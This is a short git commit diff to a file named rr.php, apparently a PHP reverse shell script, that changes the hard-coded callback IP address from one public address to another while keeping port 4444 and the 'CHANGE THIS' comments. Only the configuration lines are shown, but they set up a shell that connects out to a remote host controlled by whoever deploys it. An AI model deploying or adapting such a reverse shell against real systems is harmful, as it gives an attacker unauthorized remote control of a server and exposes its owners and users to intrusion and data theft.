cf6c48151f98a45a23442dd34c7cc66586079a40
shandell158 <140374634+shandell158@users.noreply.github.com>
2023-10-10 20:45:06 -0400

    Update rr.php

--- rr.php
+++ rr.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '172.232.10.217';  // CHANGE THIS
+$ip = '172.233.208.175';  // CHANGE THIS
 $port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
